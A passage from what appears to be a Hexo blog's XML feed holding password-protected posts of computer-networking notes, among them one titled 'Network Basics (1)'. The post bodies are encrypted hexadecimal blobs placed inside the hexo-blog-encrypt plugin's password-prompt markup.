fbf261995c29af0f7c0b498e6277bf0b4ecd677062e6d6606ab62dd02dd27b8d1a031073dfebced4a3a727f7a5325e4f846465612ea4f07ecaf9c8804c94556ff7530cce7d3c614971f67ff2927ebff4977f13a8347e151b2a52c4208a2833e6acdb586f9ce443cdbb9efb6b63075c849f135c272f67a24db9bf00338b8b7d115a69e0438be73a25e1b2310171a4acca1530a94aeaab7ed853f49d2b4dfad9d3adfb26c90a9f80450851de0f5da3d4ba4a229e06ce5ce836117a68b53a99a69406226aad6a5b07d5e77878b92385eb1aaafad38419d2f71ff9548cf9807c366c93ce0f6d18d688ea9f5beaba274a6c50b25feb22f5cea5ec38ae04bf964ce564e94c5d3faa224c3818e090e0629ca25beedf76c70d130893a888b06ceb14139007d5035ecb813277a5eadad8da12d2bee263e2798cbdbcd7b33010e7cf7cd9ac8d93193e8bde220d28b821f297c813124d7714f7bc590d2da8ae1519cfac0a215737ed6c1280d3c894311b32ea8804e866654f5f4a219ce94b9b3e241f3246111d0892f16f6ea77d17c63bacda595a77e513f10c5b9bc241cb58c2b942e2e28678e39fceb5f2438437411dc31b671264b2334c58a281b97427401f94bebafc92de351feac59a8a629a8018e838c02387be5380025dd791cd34ffa30b1e34ed814bee4f82ba99910e71ac9c39bd48cd71a8f9537e239c8d136a7a638f7cf5085b945043fc87dcb507e44f57666228cd6547e221dabb2c24e35d74963b8c92825e6c7a27326d6fc1df78d5f571cb216357773c6e389bfb7533ee0e102d2f40738f268c25c1c0bb3c106c360dbcb29146c2483e53cf1dcddf8e4568f0214a23aca0416b899e17c562fd6e85094ec373fbfc07e72595f252942957f3146ee34130d2ffbce0b43dba0bd57e6f29aa4a935ceed540bdfd5598b8d7b91e12ed9d86f49d06c27124f864c22056101dd1c3165966e8f371418659c59e5a05bd1923cb619b9ca89d291028d895064b804a1ddcbd605764507edbde03beefcc56be10ffcf0081dc355bdbd34d2a9653a37966ac168df81c4c23cdc25785899e476f5b50b95052bb8e2c67b556ae8ca5aa364478478b853933582952dc6eaad66a79fcb154af385e4ca8e355bd5c0c10f03b22fa85ef2b765449aab9007b80ea78d35223966fabd2bc9e3b64e9c9065938c566111cabb5c6f77b28b4e6df8877fd09ba8238dad1581db9138de497ed82485bd22b0b44583261bbef87bf69434e6aec96e81b5eb5f2410607635b6472d4f61cbc5b4df4d735af5b228c48f78b1a18c92be6755fabc3f4c54ad3354af0e30a36ad0a72d8b6ecf7233cf0260c4b5bdc141273bcd838862ac5e91b3365361d835a89d690423b74f73916c1bae84c82836075d644bb0fb361519e9021e484d4b8597c79f958d85ed00ccb69c22d063fab69de8a6b5cfd8b3faa156bf36cbeeb442f7ef669c7cf2d31b4858995c6dea2537a460aa8f5108379f78157fc327e7c421f6cfe2a61124670ddd776d753d51f2e1e382ce06a0272baa72bde127d3300be94bea3440bfa9e85a091a99bb2b1bfdab72c35f452a83ec7db17632b1b540248e78aac6686316490139310a22b6283fc821bf81eeaa600fb370b769a7d0d88698022f4085a42d42f2056faadf16bf0cee3f7fb1fa3433905dd16421cbef9c947c0ddd17527067cb6cdbfdbe1daf7c385bb20f3c309592aa83ce1efab888264b3ce9237a70dffaec3fede82ab4d93eb1b83ac470fe79f52d0e8ac9f0ad264aa5bd7d2993f1b4446589c9a3c4daf603d4cd0ead3d9d1b4fe031b9a9ca2bdf047b5836b8858310a4032bde14f165e1d352fe397fdfaa67386f2c4d399f136076fdf99da4ecaed52d58f9124569bb0567dc6f08e8c53c3d38008ac07f045bd5eb9b1b414547009120484a7226cd43928e6b558b6ec06668c976479f5f8429aa2a7aaa2a64a73e9b342ccfad8bce0924c2322022daefdc31f5d315fa45d03d521768e5190aab63a3f6c7148df4d659bf1d62253ea4ae2d542901e9c39e82f229a492f98472a7899505846380736ade7b645ecb4fe7dea34873032d85d0b7d49f664ad01ceb17c5fd035dbc902f40e7b6a2b99fa90407508c30acb1fe0feab08da4392fd2ee36d62e96e50c2be2e96b0f8cdf18fa75de131281f7cc9b99e76f6109e7ecd8d834e9d6c8fca25160ab4137b265118f48905a8c0cddf1a6695d690e61d7614deea40d0b41960849b6c9f9d42ca1e60541f08824aeb1767ee22227a707f37625f5be91b7d14cda658c674f7af57f86c10ae7b2335c85e530f5ef71253cc73be27c2598545bbd4077039b853d2151cf545a1b296f0d1b07ad96aac664ca2bf277bd106e1dd47d1cb2d0ab3923b841f02fba1b5c4fe4588f835a6ba97fedf8a50da195699c4d593d46ab52225b25e9fb0866f7f632fc6bf6f5e09cf1268a0ad2f931e2fa4ff209b974aa633c8b8697ff6e469478b49cd0d6a0c5dfcda4f4cd6f7120615ad218732385411c44dc6f8e2d926f7f7a7b5dbd57e76366ccec518799c06618deb761a0e4b1ab7f441fa51e3b69c61780406f9fa17fe22958e793054a00e24990fbfa82d4052ad9f9a0fdf993da1540800ef20bac3f5e6d9bf8f3f362ac160805416eed8ef1dfec4f3bf4258ae9ac541e28cddf179fe1c0beeb0301bbaf3889a1060b5d7f786d65ab2cdc728f3f7fd852856ac55022413831f38dd1befecf72654cbbd0906a72eea2254e51d297aff8b6ea3028c78a01801d564f80d5d0e49623b341a0509cd93b5551053b66d6b036170ff1d030938f7d26599f8e7ba13976ce69ffed4a1677243a03fba87d3a35115460e4a316c1a3cc9ea5a79dcaf21fc5d4e4933a68598b5059c30be373dbcd4ee5ecaa09a23615a79917e925c26df6620d29438d5bebf848e6c62f2b0d675357f019a4a665b33de8db03848de2487e231e7d99815aae7067630056b6dbbfe5d498f0b518f25588b3858b2ba763eb060a4ce307a2e0c2508538361f7a816b0023124ae9e0fad82aa7eb069366fed7b74df92427ee2e8cc67326f7a75863b36bfa92df80260497985e4baac546ef1a3f9c6c49742d811172c1adf2da91de41dbe0ede58c771aa61f833feb4ec6af66c47b26157f0326afd1949ce4affcea35c48ac5965afef590a01c5cdc9549b255f38062ecb8a66784467b95492081ed93a1951c3be166be9d0d0b119d1e1cfec0b8ecab8b168d06b550074bb8a80a81259a04d888489a02be711d24686bbefaf0b9ccabc589975adc37ac12277097daaf19206b1971fab9798c08a6f31d5602375f2afb4393f3dd7fa38c1f843b2195c7e1e1c43a9c7856735865ab74a0a56180b8882adfe6a74d591910b3c1ff70fd6c3c9a5d2b82fda9497f23eab7450e2b1d643eb12c7191fcbf6db9665a4afe2e34f10ff4387b2b3774b9c81090f031ca1203102cad4a381809700d53163b3af9185da48a0b09761e7f15c2fa1fcf6060de65348156493891b7831848973e5eb835189561786fd5fb78038e509a294ffd015d71c97184f10b13ea35b9373c7d56b54e08000f221f9c0c55bf5317fa02ca29e021316764048f5bc45a70d772aceade12be745057f58da1d1ff63049bb1952ba2019fe53c682860ddd5ad96d50073b6c9033cfcfca74a45e1f2e0726ed5222b29c69eac327d372b466e3c079b2722dd01137939737122fdc4c9731ac4b6c451f6cd1c810a12b1d73744de8f5d67998b9e57a7a3c51fc426c8afda1fd912eef868dbc5b381f35f611779e4ce8b013a510d85d7d8d0f52b32c9164fca47b22abf151a1ca91c645e434b246754f825030f15f9927a29b41c2dd8ce7e7cb0354872d528f76c696548ce5aca79fa07ee7afdcb80119c5efd05e76a98aaa90a7e189a4de468b80829e56559be4460468114efe10fdc19c9f33643242ff73d3500414ed89687038c8ba65a74f3026382b305d5d66efdfede320b54eb89930c1afaf1d7c3f3faced0a4923576206a4fa3c5628a4add1a3c9c934d4cf8119a70b6c23a9ab85a77f2db94ff0bd5888efd6f7822a92f96d57deed5624e022563d54f104124772d5070b87fe48442283233ae7c575d60a183c74226099cd0f02b52456147cae5a2b8a3d494c6bd518bd1e349559ec1f8f1d359bad9c8ae776a4b1434b005cb7cab681d8117a4824861d127220082aeab99c5f2fcbb606d55204233206f57d7ea7d77c5bb5b06822053362d8333b4f90c1ecf900662eb93bb132183665395d3d1f7b09c91f61cb4b5f5b45f2fc6d9130f71113b48441a642f9aecc78b3e5335ff96d61a02b4c3264ab0cc29f5610bd0123c520f59be2e9344cf91eb2a78ea3c73541b2fd974d605a72caf6fe904bc10cc0540f83e2148efa501cf04f2b02a07a3c66f373a77b53eeeb833484917a8817e183d97fa2797e7e44f980f5a6ba3fa58c6372778bfbefbee2f44f3d7a9bac9803d75db2c77ade453834639020f337e61a99f4c3a3fe4c392e01cb8f7d7cd22b44a9a40d122191c6903ffdcd3f463a842f1caab3aaa537284e5d338f830a64ac272b7a19f55431bc51e89d14e3544db1882c2aaee9142172340db0c05d1e558931b169f3c2c9cf98d37c74e8565b897926801d63ea1dbb4f4a0006c11f8c1e6a92bf833f0f4244062d7400c6e9a51c2805c8d671895f4170a58b98d96717d65f9e3d769193a732b8dcbe8f1d11b4e29f3dddb41120ccef58cb3648c576b9907af397c99f1c93ccc6d17781bd257d4dae63869bef3d1602e1d0599f04ad2e078b1b7205d2648aec07ab6015044bd3f9fc17caca1d38901bfd8c713b009e9d48d0206539bdb1923d06d6a4cdddae3f68b6891c479f479f9c27aabd3696b987495f662d30f80b29f0882af889a4d1383875da0e7395dc48fa5349403d3388add849e3f30f83b36214d5abaefa1f5a7a3ca7b9f7fcc9f8560e3d4ae7df97d0ce7900465030ad68dd4a0709a34f51bb728716c22fbad78af9644549673f61d404990b460e756eaff0785e9d52231d62e891dcbcef24c81d13a42ca1571fe350582380c322fc65501422d02809ffbd90e6f98890d26085419b5c175d2ba69a82fc95e1c81f04f661314da7e4fd3b7d071220e5bacd618fb8b364b1a6058cce53de1cfadd40f675cfeb33e69241bf25298583a6310eca9b977fb0dfa14591df175a442f51ea9a1170b070860b1efee3b14f08bc3a96beec35120195c2a570a45410026395ab0d7377f11296902d93385390560741e39278bb4ba65b378de62c43132412865e13fede11d673a6a875fd4a0d7c199dd0d91df5fb42b2c680fd023e9903dddd25aae32cd82070801a9acb5601950aae5bc782c18d0a5e21c432941cc9795b7276b2c61d8b5d724ecca8a52117539f7651137713a696f8a67831025760730b35372a11422fd8123bfc20e189d2f34372b911c4d2983ab6898d16e978159d5b119a04915d6b8277b734827dd288b4b819f9387dcaaa7897e23f96a346717f2a36fcbe911206c0e1b22e873bd8ef77cd71f73dafde2480a9c92bd326a9489affba7dbe1918a1ee48833a7ab2d30002bdebff7741574545776cab0c4eee39b9dde1c26f3e07053f8978705e5c4a777aa4528ea2ed8e75b7daa245c8a8114614bc1b69c64fe72fbad616c5dfbb6ad6e6b6b07523df17519fbf922d71e10f5b52b007787b5199815377a67b760bafd4c634db7350ccd6fdbe0dd2bbd31f9c598a68608c6bfa845b930be67b2f25758a474eadf069d1205e85a3d7488617330d1dca91c37e34e56f61e069014ce3ebb3c35239d854cf16e43760d53af1bf034d742f860247081ece464b200e199074ae7d5715e59af6dc5a73f34b846123c9b691125442fb4909eeb34045c364e11fb4ba3ea49f0a649379f39a7a13fbbe7b9835d6c14cc77aeb3a9fadf7c5937aa3c1799a8cd27cc1cd95da0f34deb04e320ac161824a247fdf7fbc8d7863276b8f327476e4249be2c934b3a2946202f65a90b5da8df73e4c5075b5ff37aab3c936df028bcdef74e41013de492b3be55e20cad32abbbfc60393d9ec881d1015527c648ae3487dabcce75e14a4ea07ca9f291a1ec6bb6b94ab514c6293211ecfcdd1332e0d7dc09c78209904c595a27ff69f9c67624e547b978330d8764d69399ff5ad9ed0e344b340d3673af3b02e4656a2555295f93582e5f764841f4c462823d70cd2457b8a3ad97e4b76f53dd36146459a3f1215e4e9e59b3c37419beba858051fa0cabb4037b733f55c6c104f2e8613cc7965a77fc1cccfd96fa91b3b7094d48e7a7e06435b1adeb225655022920e26526da2699784f5c75b59b5c6ee4fd61443e762614e761bc44c7ee539c8e5210b4365ccceb549d631c5cc3eebe5c98182aab9047ebf9288ed74482918f54e15d12daf4418c47a8950d8ecbee068bf7a84e125cbcc2cdfe7055dfa300a827e2fa8bd649da78563d7c79aec21e7b80db9512b32d665ecf8f7fc3091802f768c3c0d29f6261a4a2710a845bd12e047c47c4e17ceecb0ac8b42c0349d61a0ac4c672638c5b1810fdda6257de67db32f4c473c3c85b47849dc3c5471cd43686fb2d3a0aea7b25c5fb4fcea9e8f7403cf62af8f4307a1d8a119500ca391cadc955afaf76d4d510ffc28acbb074728044cb7a274544fee2e9c53c66c1fc1440680cc1391bf413f05bde4f2f76d5735f635c73bb5ee90da91bea035afc1c462f73d6fd4a4d1b0274c9da91d232dfd0463760efa47e239c4e2b8adb0aa14011d028bffe419791d70387607f890b01343a04f890a2dc839b367eb8de09b007d7764d055f957238feb8a39c1ac464390e46cab46ec9ca263b59dcc7d4d7e34b240e197ba247126cb72deb278bf9b6aa4be58f9c7d3bf5ae0a34a03868b7fe81e497cd40c7c0c9bc056b47a591bedcfa045280113d82d413948d93a1c2349061e5c2d02e2313a31d43e5753c02ccdae92618aaff8bf09af3ba4ea2f373bec55cdc05af2f84992276e9ca6884838aa9dfc663965efe4bc7616f7ddddb5baa8fb332898efe916c6e5fced7f31dc5c86847fd7deebbc38d848c9987e3728c79a958c313a114eb1578ebb1b9e289cab04b9a979c481d4bdb92e3d8d9ce787c4761e9fc12721730357b8192a4970bc1c43d450b76335698ba1bee8b539092a180afd3915acc6c6b5985c938fbc545661955e46f5e26516494447117dafc02f63d37bc5f7471ecdec528bc955d1a663a3100d51d64df1f977819843891921e5ff13f27aeac0a9c3778dc792138ba4b6dba1378ddb8e24fcb429888f41e46169e26a774dfec6c51386864dcb8b4663d02e5e92070dadff7bf9e2b791731ac071795dbf7810329e155b0dadd256dca6615bf5d825cc5b05391636a2de2d5e677b9cf540bcaba4a3a5d03ad9b5d1f48b63fe757dde91258ec5140046678d40c65320130ce4f09aed6c81b9f957ed2dc237962aa6e3dbbec463945ba7b5ba48fa14a7aed41d8429603b8b88ac59698ffd554221dc7e0e9bab36496eeead1729f66df9cb752e6bafc97ef25da289688d9d8c859ebbab8986449e49034e632b47a72bcb3b101cbce1919d53c37c638c070fa91c46af52d82b15c7ff59f34be16e308f19effddcdb78b19966d85bfda184438ddfb425c880289b607b9b85c69f6222e796bef8181ebce6fc1e99772ca29c9ae9a062d83d92040d2e35d88680a49b1851955469c7489e832bb32853f5f02d0f6ffd7636733b94775f086c2e509d5ca39e6550302fd60cd8283f6d86a712cf7f65ea85b1eb61be49840d7d23f6d1a0925a7c95119cf356760815560c5072bf33786e7c7bafbb4846c06bea8b51c927272794d50a04c7ccc8967f08a003db5e2677dfc1a2cb15dbc9ea73952c8ff764a47d4366dfeea9ac9729a55dbf6f8c9df9465fc72237d31e023d8eb242cdb45e41c6980efb0251640be46ad79f9713a4fa26550bf977ce10d483b70d693fd9ebbc13e765d43e0f9b4dcc04a648fd73bc57c732443f310e501796843bd83f884b24214378623560fae8980342928ec81d6f5efedf3028e1eb3ec0c501488865e4467492f314ea9976dca958b77b8753671136301ea47894566feb7aec2438591c56da4faee88b1a3f55d9d7b1158f3e343becb7116bce46dd7641e66f0ffe4c736230166ecd821e4dfd313b180adbfa68aaffb5e508626d7a26e6bd35c1adb953c5ae7f69e6868c740c6b552e8abcb2df53b4666d33cb3ad11b854bfad587c94a4fbcf5159b5775f0d483710cfb917b36b618bbfbc6df65dcb3de32eeaa97a62cbce26a1f2c1fa790c4eb4859fb57d3ba160eb29ef9b0ae078e0de6a4d8e9a5bcec3870de676e24355eee9f36714725c3e44699194a4c5a3e31cddbc332344dc0f27d737d3b653a33849f3067d9e9caa0be170bec7683b35c3a1fb058415eae26f2ecf1be5d3756447a7c295a97c5d1d7a4d5dba42b3c53325fc2bca8e5dbe806a75b4a8388ada4dff8367dc9174472e4c02fc2965c11a24af19db9c4006adefceefaa79f38d77b05b75c7e3f92e2add67df801f4a7f252099bcab79517ea410f87bcd7c29bc5accbf8f5a667f37e8695ed98280977fc6fb23b7fd2a8decc1a09793f6554dfa411bf6b732065e1b9eb7792c89b8d74aef98a9ee3a08f4cbcb6ec0eacf78b5c180158f92dad0026b9a52f8a803aa4126f5ad7d6e3748e51525fb9676ff06e867c8ec78cebf367f08dfb61bbe3c5ce3bdec91e7c20de2ed82fca7b25d59cce6cd053e86b08c965afb82be72c66030a8e9a1337f7dd56a9713d70792041a671e2f332ca60fa0dbe8ab4f4b1226b5571701e868662ab0221b0dc3451342b33616d43163f679277ec1c6aad0c9a5dcf676d59ff2217bec0fb72ef3b8aaec1ea5a98ee0bd445b912f6f665edd8cac2f14033cae51856927144d644a9df80acab1b068c6e7636533a0f8e48489dbff3cad1bf9e89b4673e3de94faf2c55ed60befc28198aed3775f9266e44f786fad23fe15cef4d9821667a75388e99cd40bf63b11eeacd2937af845ee474d7c3054d48f9dd38e38e589c31e034b25006e487d99be82c8af4c401cc67fb2ae579c7ac3f5d2a96c7f47db2b346d91a3fc524851ca9b0f7bffa33cf5837acafbe1e5fdb3960497fa96afedd2456ef795a0971dbff4a3d1bb035aaaa5e3bdf11379d3c5c8fbf818c89b53cd3f6a6af924df22d63b9a168908cac056f8e90f0531daebb6d0819d7828039539f0888a420f4669f47084822fd0d50c48883d049e946f11904a2b865ac13be808be0a5968aba6136559ea97c282929cf0c927fac777018b37f75c5cb9254a2a2bce35b1821f13c3a59b63ead2307a4939e5143f28a69414b8de000cfaea9f6b6cb0b04825db19b3f4d78d6e7f14bc0db033f96057252fa75a864ed92f72f9520ad31a173c2a00ba3bab03eae6506250be0cc91041115c005521f39270d6814504fec0227508f0eab3e31c8494f5a452e81aa29c15b17ad395607a82cb83246d7b3c39329bff5479853f41843aa7152a98391465599e49a2b5067f779dedb7313b9bc9e18b3f39f7a6948bbae33b5fe96bdbe340ede8751a66d27e28749a5948ef93757537aaa932d19d953b074848a8dd53f7352c7f8bc5af981501f2630b62226f64e065eb92181d5812552415fc91faa48bb16ccfb2542903fda95d0f1245c2fcdf86dcf9899751d0bd82241cf2902f745cf9434efd6411dcd2bf9b1e8a1cf0aad03eb0d34d543d70a230e133e31e67f0727d2889120fba14b4c8c1b1050f5c17abbd60d6f3217875b1ab7ba98fa0001014045240b4b799592303d7f5c95fc8d64646adbf329b65132e6d95d404b3f8b080f65959371eef4a95e37911eddd849bd522823d8ba72735816145be7e8b3bbe42a54c33cf19f42869774ef5b6715b7d7db4440b2376e96e72998e455800ad7deea635644e184fd49378f53bfe51220cdbcdc734e66aeaf7479c5c51a509cb203759e9bd790701f9a55cdb81887bbae5759607f147dc13a31c68fdcf907090e307bacf43d8b63648c568987b9088a5db3eb6416ad29cf668c50d6c84210dccf87223a7647fc432f2646f18787486b4d11408ce9b3cf9e09d2b644f06b2c6cf7cff649723902215e77a9f39851e68b79f60e67f07888258e016a157897baed8a2ecf33d86310d7e1fb09ea5836f20dddc5a394dc7213643b2dbfd89c4404326af6ccf2a797d38494c80cfed16db45c2084ee5989d8f4ea463d83d3cb7c50e63bcd7fb511e925d25bac0c58b25775f9164fd2fe6daaedb433c6b116fe12cd7db0a30ce1b4da9efc9920efbbf09f89923767e680a0bb17a94bc84b88f166616c8d239d6f7b8d533647c7d0206e0da9b20a6d00a02b52ef8e8ffcbea059fe110e604223fb23f08dc5afd3ddd43a387c429c52e04c79708c87aee3a6330db460045c60cd4e1771bfd0615492e04fa363d08d280318eb1dcf042df36a91bb6e944fba4157ecb10ecb537f3b767518c967d1c404229a56c3ece5d9052384b32c81a60968198b3cc535a8907b4adaabb6cc62ab25bcf26e12722cb88f088f41c64873518f92565b40a15b4a86a80687d1d86f9917dc8d3c5764e0ad9eca5ef76982472101f789dd24ab58812a71577ba4862c0aea38f05fadb91292c88bf14584cd34ce9efdc37729c08cf6560a0dc29531ba89d2adf1a22a1a537ddc3973beb08146323f5b02cbfa056150ef64a80a4abda2001e98e5efe843d98d91a2cb8145a86bc5e8f70f2171ce5e67e604178ec1249271a4c344628c2f96a8b6192cd469ae1d4714b70febd5412c01a0173e0822b29d0a734d18e359b3f9d0881cb07e2b188374eef403fcad150c52b5e97732fe3c09a91205fb3b5d38694b2d954a74301aa354edc68622e6ac5cdb401db82c16eeabf26ad9536f1fcaea8d66d5502418261391c64630b70ebc95b21841fdf416f3f27f76ee5c39ece76ec209cc88a82d222249eb8fdb9bc93bda88bb12ee8a05e77f734cba048364f81213741540b85b72c642a6e073692efb3d87b0fe777e9e44ec88535797cb2e88518f3e4bb90998acc0fc4101343274b3de6949f638147ecb52968117bc721679237e5fb17586a5919e4527c7ab9c801c619dc5b93c402320fb23316ba70df90a510af7d9529e2dfe70fcf2e13f6fe2dd5df316f7c88f705724098725f82c640291e50513c9ecabe235e50c4708ad6feb46a8669aefd71caaf61886568ef6e8881e4a54e3809796dc98ff2083bc517174bdd91dc466e1c00ccd8738d87937d733039d3bd46604c209509ca48c138587b490b6bc441f746c67b8388f25ca2712ad1387ae9f5452b157959acec2efeacf376af5b424aef6651de3e8593c85d740e25b1908555dbb85572fc959feec7499b200a2d3f2bd4f242245b467d805bbcc7bf4abbce3ec51b8eb2370bff748deb026a6b6b8f3595f0c0e786bcb8cf09fe03ac5507a28b948823ac963fe650723388eeb97afb0cd10f85cde40726a11f0cb05a4f59d9cb22f101d06188e6a9f7c8e89c8d3adcb50c3c4b6ffca83407cbf339702a7b9c6bd693ce570e88f4c65e33347e35be93f81e71d2d4e8161f8eb1b7aa580f4c7b43225c562717b8f8bb603212a2e27c83048558d8a231db7162d4b588d530e7d6945aaa9ba5df47849dbf621f33267f9d987d6fcb739b4597659b256b2070503fe00770b1c1e915986cc15378fd370cc027f9faae7f2ce752f0a9616ddf9cf783100dcec42d1ef41766bb6205c9772b6f5fe291002efb98a19e7e8d644477422f181eaec7f8159a4e874d50e971a4a4dde54ee0f9b9695ecf735e8dd0502b985adeacc113a1643bfac79348bc0d085a93b552becea32632013343cf515f2f5e3b99cfa0183e42882ba5276ce216c209edd1cc64ba6463b881fb16961e6ecf2c14201a88a10dbccca4b4f3043278585490c59d94cd35999f1b9747314273d33888ebb8961701c92eac842f41452e255d3440a0d1c361914010d304dec</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-wave">      <input class="hbe hbe-input-field hbe-input-field-wave" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-wave" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-wave">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-wave" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络基础知识（一）</title>
      <link href="/2022/04/24/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2022/04/24/%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="2f379d4ff44e843758a56cdea3d50fa31c0a49b3fa23e02d11d719c612c0bb83">88c650cd571e5e72ae3aef8d89bdd0d3503200449cd60fa568544dfe1fdda2fea34b92d00afd7d56f710756fbbe24acc40deb06bf17a98023a271ccc0d2fb5c76fd7e1836a2e57308fe017c6ee7771ace2b8d22b244e82f80192bd491d5cc14779730d8f45a54f23e0797dfbf516ec43d90637a6a8be555720340f1617f5ffed64d2d018b9d03a66f319a213bccb51c87cbe3e55f0e4b9ba62e88a1044d9b76ab355f4a5b85ef918a9b2de5e6f9ad06a7ccc9bcd1234ac2fd4288d62108a6f1827bb9672f7d2047b4b250583fb465298ce8730e50df440b4ea4e722815f8bef439ff183f8fe78d5b7b4ba60d9c565829ff2becc7e81c8d202864265f21e635a945e7e1a1bcf9a6c7de71ee4cb359f928f01ebf8dfb5fae13dbd2e74cdd8438418f2382add37e65e8a2d2643fdd59d990b98fbf75b1335ebe249f714e547504dfd34693f8eff5a18cdd6cf3685b8addaf62533cb3e8d94de82b0d75a356adb0985effdcfe3b2bd60fb9a6b988992829b7423602cdbfb2e07fa6dc708edc106dba9e906255c5360393e0ffad83d1e3abd4be620bc5f405dd6c54f1807542fffd952766adf075c1b91341c53edc685f3ef226be4207bc5bde0b2bf5d94e72e453b88d37e647da9a3164bac81ee50447bce5f3b9cbd2ee0340851bb89b92dea3fd999bcc5b7e318fff98a9c1b3d779d2ea0152a69813ac2adc8e12e46c7c217f1ac447678afa913efe77318f432c04a049b6dd4ddf4cc101cf0e3e45e5e929a2fd530dbdfc7010b4b837b4117dc7081158744ae0212c35e3012924691a0b89fc05dca1272a42bfa120fad9bda19392fe57fbb5308db4473731bc386f0f7a1fd6c9511e504f15294129f9e1a908ba700091b2fc55edfbdde800b02cb43dd061ab4a8512e03d3d946159198e8814bc12ffef6a5aabd9c45d3abba17042eb4e18e302ccb6cab7f4bac3d08fc6cb67fee943517019019a8b43aedeeb17b884ce1e51bc3948a276a098b667ec139338345393da5f6386960e84eecf013a5c925b8849d040685ed3099abc804c44037d5e7b67726f5beedaff9967e93d04e6498922eb1a9e4842f0df466ad165edd9367c9a7ce065af970c6d7a5def7fa78e198cd97633ed8778e5c13ef5c5e599f4a34d3e4fb9a0252b2b30b14f261e8c770db68865a0940366039b73a58114c94b3dd7b0b629ec251959da7e4672d027b60c738d8b858233eb880815ddbb9cdd7b8fa66bcbc9c782da00dfa2c8c81b21d1e86033245a56060c9770cfd49932f7b07bdc754c0a3005994192f8a04afd474051cb46858d0981cbd5d53aa7d90c05c7690962391c643a58436cbc9ddfdc57ac09becd504aa06c469cf2d6e29753c0da16a0b9aa3bcfe7875a0a4ea2ada7d322cce9c3e8fce4be275e0744031b5205bb06e6c7adfd75f80bbc50acb114077669424d667b2f3ee58b73c63da4ffe9839e4cf10b545d83bf34e2d09bcbeab90a211301125db88da893999837d285335868651c9c8d341a55559fa92610d4b1f33342534da1b7bf34d9f9156fb5c0efdd2767503468ae2f0e67fd280f21cbc2a522c37a8288bf8046b3834340e5e41bd5e4f4966a4f642690e61587d821b7a6ceaa2528992a4887a201f4f8ce6dc0895ae52e1fce2e1784415f9e9b6aeafa94f8acb8cb02a94d92211d2d277895e2ff3526b75bb3111a1b700ae66ba951be9dec52a6e673a6722c4fe94fccaa3a636db1d9c0bd97ed4c913665fa0071bd1ebdbfeaa752ca94fd6bea3d164adccb78712ed42585da65b9b5d920603cf76fea692e9f30c895263d80448cd6343a01d1a096aaa687766e61df7869c1f719a9c321322d4cc31dbc4f8aa6944fdaedbccdcb9e4932280fb10af79bdaebd19c4d6441fe9977bc27319e897ab36abac65856db2d3e7a2ff09ff49a7aaf195864e0b8e4a04b19950674242fb58852c132fa9ad50f2ce8f11d294345319793077fb91152e77812bf4a79e5d777e16922d17a003eba89003a154b7c81df3c553e79123842483b8af3113ab10123c7420290c2caa83d807a466f0528d49492c570f0932afde68e05cfb280d14dfbfb994404f4e5eacbb041d7b6602066d74a57e4cc7a8642d536b4e650dc19833d4a19d9d469a292f12e27ba71dc78a807b2d5a21e4d58d30e7cb3c7baa5dbf8208d555828dc2c42db08a3049221a08aceeaaed6faaf5af926a63ec185548dff275401c1888cbe9fe984de0a8b1980cc15925d5b93e8c0c27d31c85502cbd04ddc22cac70439897d762e2b2b4874372762f4551559308f4c54ae9a89e83a7972e7b243f0fd3291fa223a9745528c10a030e83ba6e95be83a12f196f85ef89c080ab4473821c510775960f6c282636172c2a6e92c7b20b08267f0503aaceaf38ebfc555154d6f3671acdd7333a23c984db81b233902259493695e015109be536be0200455e2fb5dfb91853f1186713a95be63cc9049fdfee279d7a5518cbc06ccfe7694e5a5b569fdd6e82b13096a34059e3d3e45a4f4389b831c5ce3e466d5117fdb4b3286d378542c2aa606c2212dfeae444601ef4a922525db6d908a3a9d06ca2aeee72b8c92036f0ae7a0f04eb3d535dca53113e0afb1ff02bc97038387f3b3b355ce847f41d9b4c9f21bcd386418795b3e49835ee6ac8ae9107eb39873946af1c98e75640de1be65eb2d682a0725ed3da863e998c14fb175b066c5e214c6c3b4e1830b3dd8c7d8fd08934bb547bb0d51bc89c611d2878969275f673e5ec2d5f4ba04edc2cbac708eecd64678a90021911bc52e7613f864f3638936b194ffd2f40f3089050830290ab0c42e7b92af00ddcaa3cb36e86426fef77db1a49998522ebe92f381bae2c8d30c017c790c40dc53d9841b61f069f55878f965541087ab5e302b1d50b45ea87eb1bd756688c03f9734599f5fc1c0c61362b6a9ffd34c1c7f09db0a74025e4cd5d44a25371b3cfd9e2be47df6187006a029a11fae8001b9109f9c6d550501a2409ad1c75f1a824e9fb6d0fa87c5126649dcecb59a6c903ba443695d4db5e5a29ad7450be4788610e56807e2dc37cb2527f612e11da46c3ddc2b8f32cbceb4499ec9c6bac33ec6f845189614b3fd69e2ae0f4666a29f2d4b65e9f7d8b73d87ee8847e726cfa36496e512cb174946a4ae7de861c14791add88a40cd1b3a51d60bfc5500be0553788ec710172cbc6c03a8a05206ac9348362af8e67880cdd38541e0b7e9e1d8cc706034004bb9400718e67e35dae9dc457991edafb54c32b9557bf078aadd9c06ea6a78d81485e850ce988876d41a78122ffee547f1ee82d14827fb0bd46da49715aa72a0455e23a58fad9322fd2968b7c0edd105f956a45548348181f37f907658b9b5c7ba23c02ef150039ef61de191d1a727bcce9131fc8564ecadf451c22fc82eb61ad71ec743b8b81212c